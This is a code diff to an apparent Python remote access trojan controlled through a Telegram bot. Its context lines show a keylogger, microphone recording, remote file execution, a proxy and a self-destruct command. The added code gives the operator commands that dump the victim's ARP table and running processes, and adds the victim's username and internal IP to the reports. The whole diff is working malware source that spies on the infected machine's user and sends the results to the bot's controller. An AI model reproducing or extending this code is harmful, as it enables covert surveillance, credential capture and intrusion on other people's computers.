@@ -12,8 +12,11 @@ import threading 									#used for proxy
 import proxy
 import pyaudio, wave 								# /hear
 import telepot, requests 							# telepot => telegram, requests => file download
+from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
 import os, os.path, platform, ctypes
 import pyHook, pythoncom 							# keylogger
+import getpass
+import socket
 
 me = singleton.SingleInstance() 
 
@@ -63,6 +66,8 @@ functionalities = { '/capture_pc' : '', \
 					'/pwd':'', \
 					'/run':'<target_file>', \
 					'/self_destruct':'', \
+		   			'/arp':' Returns ARP Table', \
+		   			'/tasklist':' Returns the processlist', \
 					'/to':'<target_computer>, [other_target_computer]'}
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
@@ -70,7 +75,12 @@ with open(log_file, "a") as writing:
 	
 def checkchat_id(chat_id):
 	return len(known_ids) == 0 or str(chat_id) in known_ids
-	
+
+def internalIP():
+	internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	internal_ip.connect(('google.com', 0))
+	return internal_ip.getsockname()[0]
+
 def pressed_chars(event):
 	if event and type(event.Ascii) == int:
 		f = open(log_file,"a")
@@ -193,7 +203,7 @@ def handle(msg):
 			elif command == '/ip_info':
 				bot.sendChatAction(chat_id, 'find_location')
 				info = requests.get('http://ipinfo.io').text #json format
-				response = info
+				response = 'External IP: ' + info.replace('{','').replace('}','').replace(' "','').replace('"','') + '\n' + 'Internal IP: ' + '\n' + internalIP()
 				location = (loads(info)['loc']).split(',')
 				bot.sendLocation(chat_id, location[0], location[1])
 			elif command == '/keylogs':
@@ -224,7 +234,7 @@ def handle(msg):
 				info = ''
 				for pc_info in platform.uname():
 					info += '\n' + pc_info
-				response = info
+				response = info + '\n' + 'Username: ' + getpass.getuser()
 			elif command.startswith('/play'):
 				command = command.replace('/play ', '')
 				command = command.strip()
@@ -245,6 +255,17 @@ def handle(msg):
 				response = 'Proxy succesfully setup on ' + ip + ':8081'
 			elif command == '/pwd':
 				response = os.getcwd()
+			elif command == '/arp':
+				bot.sendChatAction(chat_id, 'typing')
+				lines = os.popen('arp -a -N ' + internalIP())
+				for line in lines:
+					line.replace('\n\n', '\n')
+					response += line
+			elif command == '/tasklist':
+				lines = os.popen('tasklist /FI "STATUS eq RUNNING"')
+				for line in lines:
+					line.replace('\n\n', '\n')
+					response += line
 			elif command.startswith('/run'):
 				bot.sendChatAction(chat_id, 'typing')
 				path_file = command.replace('/run', '')
